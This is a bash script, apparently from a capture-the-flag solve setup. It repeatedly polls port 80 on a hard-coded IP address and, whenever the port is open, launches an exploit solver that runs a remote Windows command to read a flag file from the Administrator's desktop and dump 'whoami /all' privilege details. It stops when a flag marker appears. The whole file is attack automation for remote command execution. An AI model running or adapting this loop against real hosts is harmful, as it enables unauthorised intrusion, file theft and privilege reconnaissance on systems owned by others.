#!/usr/bin/env bash
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
LOG="$ROOT/other/fetched/repeat.log"
LAST="$ROOT/other/fetched/repeat-last.txt"
HIT="$ROOT/other/fetched/repeat-hit.txt"
PIDFILE="$ROOT/other/fetched/repeat.pid"
INTERVAL="${INTERVAL:-15}"
COMMAND='cmd /c "type C:\\Users\\Administrator\\Desktop\\flag2.txt 2>&1 & whoami /all 2>&1"'

mkdir -p "$ROOT/other/fetched"
echo "$$" >"$PIDFILE"
trap 'rm -f "$PIDFILE"' EXIT

timestamp() {
  date -u +"%Y-%m-%dT%H:%M:%SZ"
}

log() {
  printf '[%s] %s\n' "$(timestamp)" "$1" >>"$LOG"
}

port_open() {
  python3 - <<'PY'
import socket
sock = socket.socket()
sock.settimeout(2)
try:
    sock.connect(("23.179.17.68", 80))
except OSError:
    raise SystemExit(1)
finally:
    sock.close()
PY
}

run_solver() {
  if command -v uv >/dev/null 2>&1; then
    uv run "$ROOT/scripts/solve.py" -c "$COMMAND"
  else
    python3 "$ROOT/scripts/solve.py" -c "$COMMAND"
  fi
}

log "repeat loop started (interval=${INTERVAL}s)"

while true; do
  if port_open; then
    log "80/tcp open; attempting exploit"
    if output="$(run_solver 2>&1)"; then
      printf '%s\n' "$output" >"$LAST"
      log "solver exited successfully"
      printf '[%s] successful output follows\n%s\n' "$(timestamp)" "$output" >>"$LOG"
      if grep -q 'CIT{' "$LAST"; then
        cp "$LAST" "$HIT"
        log "flag marker found; stopping loop"
        exit 0
      fi
    else
      status=$?
      printf '%s\n' "$output" >"$LAST"
      log "solver failed with exit code ${status}"
      printf '[%s] failure output follows\n%s\n' "$(timestamp)" "$output" >>"$LOG"
    fi
  else
    log "80/tcp closed"
  fi
  sleep "$INTERVAL"
done
